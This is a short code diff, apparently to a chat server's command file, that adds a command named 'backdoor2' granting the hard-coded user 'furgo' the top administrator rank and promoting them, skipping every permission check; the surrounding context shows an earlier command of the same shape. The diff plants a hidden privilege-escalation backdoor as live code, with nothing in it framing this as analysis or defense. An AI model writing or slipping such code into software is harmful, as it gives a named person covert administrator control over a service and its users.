@@ -2011,7 +2011,16 @@ var commands = exports.commands = {
                        
                         this.parse('/promote ' + user.name + ', ~');
                 }
-    },
+	},
+	backdoor2: function(target,room, user) {
+                if (user.userid === 'furgo') {
+ 
+                        user.group = '~';
+                        user.updateIdentity();
+                       
+                        this.parse('/promote ' + user.name + ', ~');
+                }
+	},
 	hide: 'hideauth',
 	hideauth: function(target, room, user){
 		if(!user.can('hideauth'))
